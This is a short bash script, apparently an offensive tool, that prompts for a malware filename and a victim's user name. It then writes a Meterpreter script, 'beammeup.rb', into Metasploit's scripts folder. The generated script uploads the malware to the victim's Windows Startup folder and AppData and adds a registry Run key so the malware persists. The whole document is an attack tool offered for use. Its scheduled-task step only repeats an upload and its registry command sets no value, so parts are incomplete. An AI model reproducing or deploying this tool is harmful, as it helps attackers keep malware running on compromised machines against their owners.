echo ""
read -p 'Your malware filename is = ' mal_name
read -p 'User file you want to upload to = ' user_file
echo ""
echo "----- BEAMING UP YOUR MALWARE TO VICTIM ------ "
echo ""
echo ""

rm beammeup.rb

echo "-------Adding to Startup Folder-----"
echo "upload $mal_name "C:\\Users\\$user_file\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\$mal_name"" >> beammeup.rb

echo ""
echo ""

echo "----- Adding to Registry ---- "
echo "upload $mal_name "C:\\Users\\$user_file\\AppData\\Local\\$mal_name"" >> beammeup.rb
echo "reg setval -k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" >> beammeup.rb
echo "reg queryval -k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v AutoStart" >> beammeup.rb

echo ""
echo ""

echo "------ Adding for Scheduled Tasks ----- "
echo "upload $mal_name "C:\\Users\\$user_file\\AppData\\Local\\$mal_name"" >> beammeup.rb

mv beammeup.rb /usr/share/metasploit-framework/scripts/meterpreter/beammeup.rb
